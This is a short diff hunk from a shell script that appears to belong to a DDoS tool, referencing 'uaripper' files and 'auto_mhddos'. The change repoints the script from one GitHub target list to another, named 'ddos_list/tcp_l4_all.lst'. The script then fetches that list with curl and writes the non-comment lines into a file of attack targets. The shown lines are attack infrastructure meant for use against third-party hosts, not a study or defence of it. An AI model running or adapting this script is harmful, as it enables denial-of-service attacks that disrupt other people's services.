@@ -53,7 +53,7 @@ export t4="/var/tmp/xad.uaripper"
 rm -f /var/tmp/*uaripper #remove previous copies
 
 # read targets from github and put them in file $targets_curl. Commented and empty lines excluded.
-echo "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets)" | while read LINE; do
+echo "$(curl -s https://raw.githubusercontent.com/olamor/ddos_list/main/tcp_l4_all.lst)" | while read LINE; do
     if [[ "$LINE" != "#"* ]] && [ "$LINE" != "" ] ; then
         echo $LINE >> $targets_curl
     fi
